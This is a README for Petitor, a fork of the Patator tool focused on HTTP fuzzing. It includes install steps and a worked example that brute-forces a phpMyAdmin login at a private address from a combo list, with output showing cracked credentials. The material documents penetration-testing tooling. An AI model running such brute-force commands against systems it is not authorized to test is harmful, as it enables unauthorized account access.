# Petitor (work in progress!)

Petitor is a stripped-down fork of Patator by lanjelot, exclusively focused on HTTP fuzzing.
Patator was written out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks.

## Differences from Patator

- Module functionality dropped. http_fuzz only.
- Windows support dropped. Might still work. Not tested.
- Compatible with recent Python versions.

## To-do

- Break down huge monolithic codebase in `petitor.py` into logically organized modules.
- Refactor for readability and PEP-8 compliance.
- Lots of testing.

## Install

```
git clone https://github.com/n0kovo/petitor.git
git clone https://github.com/danielmiessler/SecLists.git
docker build -t petitor petitor/
docker run -it --rm -v $PWD/SecLists/Passwords:/mnt petitor dummy_test data=FILE0 0=/mnt/richelieu-french-top5000.txt
```

## Usage Example

* HTTP : Brute-force phpMyAdmin logon

```
$ petitor url=http://10.0.0.1/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
11:53:47 petitor    INFO - Starting Patator v0.7-beta (http://code.google.com/p/patator/) at 2014-08-31 11:53 EST
11:53:47 petitor    INFO -
11:53:47 petitor    INFO - code size:clen       time | candidate                          |   num | mesg
11:53:47 petitor    INFO - -----------------------------------------------------------------------------
11:53:48 petitor    INFO - 200  49585:0        0.150 | root:p@ssw0rd                      |    26 | HTTP/1.1 200 OK
11:53:51 petitor    INFO - 200  13215:0        0.351 | root:                              |    72 | HTTP/1.1 200 OK
^C
11:53:54 petitor    INFO - Hits/Done/Skip/Fail/Size: 2/198/0/0/3000, Avg: 29 r/s, Time: 0h 0m 6s
11:53:54 petitor    INFO - To resume execution, pass --resume 15,15,15,16,15,36,15,16,15,40
```

Payload #72 was a false positive due to an unexpected error message:

```
$ grep AllowNoPassword /tmp/qsdf/72_200\:13215\:0\:0.351.txt
... class="icon ic_s_error" /> Login without a password is forbidden by configuration (see AllowNoPassword)</div><noscript>
```
